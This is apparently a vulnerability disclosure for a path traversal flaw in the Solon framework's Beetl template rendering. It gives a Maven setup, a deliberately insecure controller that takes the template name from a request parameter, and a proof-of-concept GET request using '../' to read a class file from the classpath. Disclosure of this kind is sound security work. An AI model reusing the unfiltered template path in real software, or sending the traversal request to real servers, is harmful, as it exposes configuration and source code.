# solon Template vul

# detail:

## maven config:

```text
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>solon</artifactId>
    <version>1.0-SNAPSHOT</version>
    <parent>
        <groupId>org.noear</groupId>
        <artifactId>solon-parent</artifactId>
        <version>3.1.1-M2</version>
    </parent>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-boot-jdkhttp</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-net-stomp</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-expression</artifactId>
            <version>3.1.1-SNAPSHOT</version>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-serialization-gson</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-view-beetl</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-serialization-properties</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>folkmq-transport-netty</artifactId>
            <version>1.7.8</version>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-serialization-kryo</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-data-sqlutils</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-serialization-jackson-xml</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-serialization-fury</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-security-auth</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-web-servlet-jakarta</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>grit-client-solon-plugin</artifactId>
            <version>2.0.0</version>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-sessionstate-local</artifactId>
        </dependency>
        <dependency>
            <groupId>org.noear</groupId>
            <artifactId>solon-sessionstate-jedis</artifactId>
        </dependency>


    </dependencies>

</project>
```

## Recurrence process

```text
package org.example;

import org.noear.solon.annotation.Controller;
import org.noear.solon.annotation.Mapping;
import org.noear.solon.annotation.Post;
import org.noear.solon.core.handle.Context;
import org.noear.solon.core.handle.ModelAndView;
import org.noear.solon.core.handle.UploadedFile;

import java.io.IOException;

@Controller    //这标明是一个solon的控制器
public class HelloApp {

    @Mapping("/aa")
    public ModelAndView aa(Context ctx) throws IOException {
        ModelAndView modelAndView = new ModelAndView(ctx.param("template"));
        return modelAndView;
    }
}

```

Write the above code, and we start the service

![img.png](/imgs/solon-vul1-1.png)

```text

GET /aa?template=../org/example/HelloApp.class HTTP/1.1
Host: 127.0.0.1:8080
sec-fetch-dest: document
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
sec-fetch-mode: navigate
sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
Accept-Encoding: gzip, deflate, br, zstd
Cookie: SOLONID=f57bf768b5aa46609ecc0d7a3d78b43d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua-platform: "macOS"
X-Serialization: .htm
Upgrade-Insecure-Requests: 1
sec-fetch-site: cross-site
sec-ch-ua-mobile: ?0
Referer: http://192.168.31.80:8080/aa
Origin: http://192.168.31.80:8080




```

## reason:

### org.noear.solon.core.handle.RenderManager


![img.png](/imgs/solon-vul1-2.png)

### org.noear.solon.view.beetl.BeetlRender

![img.png](/imgs/solon-vul1-3.png)

![img.png](/imgs/solon-vul1-4.png)

When the file is read, it is spliced and rendered directly without any filtering.

This can only read from the classPath, but fortunately there may be configuration or source code in the ClassPath
![img.png](/imgs/solon-vul1-5.png)
